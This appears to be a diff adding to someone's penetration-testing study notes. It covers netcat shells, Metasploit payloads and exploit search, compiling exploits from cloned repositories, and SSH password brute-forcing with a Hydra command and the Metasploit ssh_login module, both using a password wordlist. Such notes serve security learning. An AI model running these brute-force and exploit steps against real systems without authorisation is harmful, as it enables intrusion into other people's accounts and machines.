@@ -141,6 +141,7 @@ Attack:
 nc victimIP 4444
 
 Payloads:
+
 Staged versus Non-Staged
 Non-staged payloads means sending the entire payload in one go. The problem is that these are often large in size and it will often not work.
 Staged means that the payloads are sent in stages, but this can be less stable. 
@@ -150,6 +151,7 @@ staged example: windows/meterpreter/reverse_tcp
 Note, the above syntax is how to know if a payload is staged or non-staged, so it carries through through out Metasploit. 
 
 Metasploit:
+
 syntax: msfconsole
 syntax: search vulnerability (for example samba 2.2)
 based on our info gathering, we should know the underlying OS, so we can select the correct exploit
@@ -168,6 +170,37 @@ syntax: options
 syntax: set LHOST and RHOST (if needed)
 syntax: exploit
 Keep trying until you find an exploit that works for you.
+
+Manual Exploitation: 
+
+For example:
+git clone a repo
+follow the steps to install required packages
+use gcc to make it executable
+run the file to see options
+run with the options
+
+Brute Force Attacks:
+
+Sometimes we want to actually be loud during a penetration test so that the company can say: "hey, we see you", which means you can give cudoos to them in the report and say "you saw me here and here, but not here."
+
+Brute force SSH:
+Hydra is a great tool to bruteforce SSH. 
+syntax: hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://IP:PORT -t 4 -V (for example, where -l is the username (-L could be used for a list), -P for password list, ssh to say what we are attacking and -t for the number of threads and -V for verbosity)
+Alternative:
+Metasploit
+syntax: msfconsole
+syntax: search ssh
+we are looking for an auxiliary module
+syntax: use auxiliary/scanner/ssh/ssh_login
+syntax: options
+syntax: set username root
+syntax: set pass file /usr/share/wordlists/metasploit/unix_passwords.txt
+syntax: set RHOSTS IP
+syntax: options
+syntax: run
+
+Credential Spraying and Password Stuffing:
 
 
 
